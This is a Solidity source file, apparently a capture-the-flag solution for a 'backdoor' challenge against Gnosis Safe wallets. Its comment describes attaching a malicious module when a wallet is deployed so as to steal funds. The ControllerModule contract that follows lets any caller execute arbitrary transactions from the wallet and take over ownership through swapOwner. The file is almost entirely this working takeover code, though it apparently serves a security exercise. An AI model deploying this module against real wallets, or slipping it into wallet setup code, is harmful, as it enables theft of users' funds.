pragma solidity 0.8.12;

import {ModuleManager} from "gnosis/base/ModuleManager.sol";
import {Enum} from "gnosis/common/Enum.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";

 /**
 *@notice
 * The challenge is called backdoor because it's possible to implement a backdoor on the deployment of a 
 * new wallet, by attaching it to a module. 
 * On the same transaction, and before it finishes, the malicious actor can passes data that can alter the 
 * states of the Gnosis Safe wallet. 
 * Now the question is, what data to passes by, in order to steal the funds from 4 contracts
 * In the same transaction. 
 */

contract ControllerModule is ModuleManager {

    GnosisSafe internal proxy;
    
    function setup(address payable proxy_) public {
        proxy = GnosisSafe(proxy_);
    }
    
    // Allows anyone to execute a call from the controlled wallet
    function executeCall(address to, uint256 value, bytes memory data) public {
        // `manager` represents the wallet under control
        require(
            proxy.execTransactionFromModule(to, value, data, Enum.Operation.Call)
        );
    }
    
    // Allows anyone to become the wallet's owner
    function becomeOwner(address currentOwner) external {
        executeCall(
            address(proxy),
            0,
            abi.encodeWithSignature(
                "swapOwner(address,address,address)",
                address(0x1),
                currentOwner,
                msg.sender
            )
        );
    }
}